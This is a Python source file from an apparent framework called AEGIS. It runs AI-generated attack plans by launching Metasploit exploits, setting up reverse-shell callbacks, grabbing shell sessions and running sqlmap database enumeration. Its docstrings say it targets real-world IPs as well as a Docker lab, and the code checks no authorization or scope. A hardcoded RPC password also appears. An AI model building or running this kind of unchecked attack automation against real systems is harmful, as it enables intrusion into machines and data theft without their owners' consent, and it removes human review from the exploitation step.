"""
AEGIS core/attack_engine.py
=============================
Executes the attack plan generated by ai_engine.py.

DESIGN PRINCIPLE:
  This engine works for ANY target — localhost Docker lab OR real-world IPs.
  Docker port remapping ONLY applies when target is localhost/127.0.0.1.
  For real targets, ports are used exactly as the AI specifies them.
"""

import subprocess
import json
import os
import re
import time
import hashlib
from datetime import datetime
from django.conf import settings

# Docker port remapping — ONLY used when target is localhost/127.0.0.1
# Maps container-internal ports to Docker-mapped host ports
_DOCKER_PORT_MAP = {
    21:   2121,   # FTP → mapped port
    22:   2222,   # SSH → mapped port
    80:   8083,   # HTTP → mapped port
}

# Localhost identifiers — port mapping only applies to these
_LOCALHOST_TARGETS = {'localhost', '127.0.0.1', '::1', 'host.docker.internal'}


def _is_local_target(target: str) -> bool:
    """Returns True if target is a Docker lab on localhost."""
    return target.strip().lower() in _LOCALHOST_TARGETS


def _resolve_docker_gateway() -> str:
    """Finds the Docker bridge gateway IP for reverse shell callbacks."""
    try:
        result = subprocess.run(
            ["docker", "network", "inspect", "aegis_framework_aegis-net",
             "--format", "{{range .IPAM.Config}}{{.Gateway}}{{end}}"],
            capture_output=True, text=True, timeout=5
        )
        gw = result.stdout.strip()
        if gw:
            return gw
    except Exception:
        pass
    return getattr(settings, 'DOCKER_GATEWAY', '172.19.0.1')


class AttackOrchestrator:
    """
    Receives an AI-generated attack plan and executes each step.
    Logs everything to DB and saves evidence for forensics.
    Works for any target — lab or production.
    """

    def __init__(self, scan_result, attack_plan: dict):
        self.scan_result  = scan_result
        self.attack_plan  = attack_plan
        self.target       = attack_plan.get("target", scan_result.target)
        self.is_local     = _is_local_target(self.target)
        self.results      = []
        self.evidence_dir = f"evidence/{scan_result.id}"
        os.makedirs(self.evidence_dir, exist_ok=True)

    def _map_port(self, port: int) -> int:
        """Remaps port ONLY for localhost Docker targets."""
        if self.is_local:
            return _DOCKER_PORT_MAP.get(port, port)
        return port

    def execute(self) -> dict:
        sequence = self.attack_plan.get("attack_sequence", [])

        if not sequence:
            return {
                "status":  "NO_ATTACKS",
                "message": "AI found no exploitable vulnerabilities",
                "results": []
            }

        sequence = sorted(sequence, key=lambda x: x.get("priority", 99))

        for attack in sequence:
            tool   = attack.get("tool", "manual").lower()
            result = self._execute_single_attack(attack, tool)
            self.results.append(result)

            if result.get("success") and result.get("shell"):
                post = self._post_exploitation(result["shell"])
                result["post_exploitation"] = post

        return {
            "status":      "COMPLETE",
            "target":      self.target,
            "attacks_run": len(self.results),
            "successful":  sum(1 for r in self.results if r.get("success")),
            "results":     self.results,
            "evidence_dir": self.evidence_dir,
            "timestamp":   datetime.now().isoformat()
        }

    def _execute_single_attack(self, attack: dict, tool: str) -> dict:
        from scanner_ui.models import AttackLog

        log = AttackLog.objects.create(
            scan        = self.scan_result,
            tool_used   = tool,
            module      = attack.get("module") or attack.get("command") or "unknown",
            target_port = attack.get("port"),
            status      = "RUNNING"
        )

        try:
            if tool == "metasploit":
                result = self._run_metasploit(attack)
            elif tool == "sqlmap":
                result = self._run_sqlmap(attack)
            elif tool == "hydra":
                result = self._run_hydra(attack)
            elif tool == "nikto":
                result = self._run_nikto(attack)
            elif tool == "zap":
                result = self._run_zap(attack)
            elif tool == "netcat":
                result = self._run_netcat(attack)
            else:
                result = self._manual_instructions(attack)

            log.status     = "SUCCESS" if result.get("success") else "FAILED"
            log.output     = result.get("output", "")[:5000]
            log.session_id = result.get("session_id", "")
            log.save()

            result["vulnerability"] = attack.get("vulnerability", "")
            result["tool"]          = tool
            result["port"]          = attack.get("port")

            self._save_evidence(result, attack)
            return result

        except Exception as e:
            log.status = "ERROR"
            log.output = str(e)
            log.save()
            return {
                "success": False, "tool": tool,
                "error": str(e), "output": f"Attack error: {str(e)}"
            }

    # ─────────────────────────────────────────────────────────────────────────
    # METASPLOIT
    # ─────────────────────────────────────────────────────────────────────────

    def _run_metasploit(self, attack: dict) -> dict:
        module  = attack.get("module", "")
        options = attack.get("options", {})
        payload = attack.get("payload", "")

        # Normalise RHOST → RHOSTS
        if "RHOST" in options and "RHOSTS" not in options:
            options["RHOSTS"] = options.pop("RHOST")

        if "RHOSTS" not in options:
            options["RHOSTS"] = self.target

        # Port mapping — ONLY for localhost Docker lab
        if "RPORT" not in options and attack.get("port"):
            options["RPORT"] = str(self._map_port(attack.get("port")))
        elif "RPORT" in options and self.is_local:
            rport = int(options["RPORT"])
            options["RPORT"] = str(_DOCKER_PORT_MAP.get(rport, rport))

        # For reverse-shell payloads on Docker, set LHOST to gateway
        if payload and "reverse" in payload.lower() and self.is_local:
            if "LHOST" not in options:
                options["LHOST"] = _resolve_docker_gateway()

        try:
            from pymetasploit3.msfrpc import MsfRpcClient

            msf_host = getattr(settings, 'METASPLOIT_HOST', 'localhost')
            msf_port = int(getattr(settings, 'METASPLOIT_PORT', 55553))
            msf_pass = getattr(settings, 'METASPLOIT_PASS', 'aegis123')

            client = MsfRpcClient(msf_pass, server=msf_host, port=msf_port, ssl=False)

            # Verify module exists
            try:
                exploit = client.modules.use('exploit', module)
            except Exception:
                return {
                    "success": False,
                    "output":  f"Module not found: {module}",
                    "module":  module
                }

            # Set options
            for key, value in options.items():
                try:
                    exploit[key] = str(value)
                except Exception:
                    pass

            if payload:
                try:
                    exploit['PAYLOAD'] = payload
                except Exception:
                    pass

            # Execute
            job = exploit.execute(payload=payload if payload else None)
            if not isinstance(job, dict):
                return {
                    "success": False,
                    "output":  (f"Module failed to execute.\n"
                                f"Module: {module}\n"
                                f"Options: {json.dumps(options, indent=2)}"),
                    "module":  module
                }

            job_id = job.get('job_id')

            # Wait for session — 45 seconds
            for _ in range(45):
                time.sleep(1)
                sessions = client.sessions.list
                if sessions:
                    session_id = list(sessions.keys())[-1]
                    session    = client.sessions.session(session_id)
                    session.write("id\n")
                    time.sleep(1)
                    output = session.read()
                    return {
                        "success":    True,
                        "output":     f"Shell obtained!\n{output}",
                        "session_id": str(session_id),
                        "shell":      session,
                        "module":     module
                    }

            return {
                "success": False,
                "output":  (f"Module executed, no session after 45s.\n"
                            f"Job: {job_id} | Module: {module}\n"
                            f"Options: {json.dumps(options, indent=2)}\n"
                            f"Possible causes: target not vulnerable, "
                            f"firewall blocking callback, wrong payload."),
                "module":  module
            }

        except ConnectionRefusedError:
            return {
                "success": False,
                "output":  (f"[METASPLOIT NOT RUNNING]\n"
                            f"Start: msfconsole -q -x \"load msgrpc "
                            f"Pass=aegis123 ServerPort=55553 SSL=false\"\n"
                            f"Module: {module}"),
                "module":  module
            }
        except Exception as e:
            return {
                "success": False,
                "output":  f"Metasploit error: {str(e)}\nModule: {module}",
                "module":  module
            }

    # ─────────────────────────────────────────────────────────────────────────
    # SQLMAP
    # ─────────────────────────────────────────────────────────────────────────

    def _run_sqlmap(self, attack: dict) -> dict:
        port    = attack.get("port", 80)
        options = attack.get("options", {})
        scheme  = "https" if port == 443 else "http"

        url = (options.get("url")
               or options.get("target_url")
               or f"{scheme}://{self.target}:{port}/")

        output_dir = f"{self.evidence_dir}/sqlmap"
        os.makedirs(output_dir, exist_ok=True)
        cookie = options.get("cookie", "")

        try:
            cmd = [
                "sqlmap", "-u", url,
                "--batch", "--level", "3", "--risk", "2",
                "--dbs", "--output-dir", output_dir,
                "--timeout", "30", "--forms",
                "--crawl", "3", "--random-agent",
            ]
            if cookie:
                cmd += ["--cookie", cookie]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=240)
            output = result.stdout + result.stderr
            success = ("injectable" in output.lower()
                       or "sqlmap identified" in output.lower()
                       or ("parameter" in output.lower()
                           and "is vulnerable" in output.lower()))

            return {"success": success, "output": output[:3000],
                    "url": url, "tool": "sqlmap"}

        except FileNotFoundError:
            return {"success": False, "output": "[ERROR] sqlmap not installed"}
        except subprocess.TimeoutExpired:
            return {"success": False, "output": "[TIMEOUT] SQLMap exceeded 4 minutes"}
        except Exception as e:
            return {"success": False, "output": f"SQLMap error: {str(e)}"}

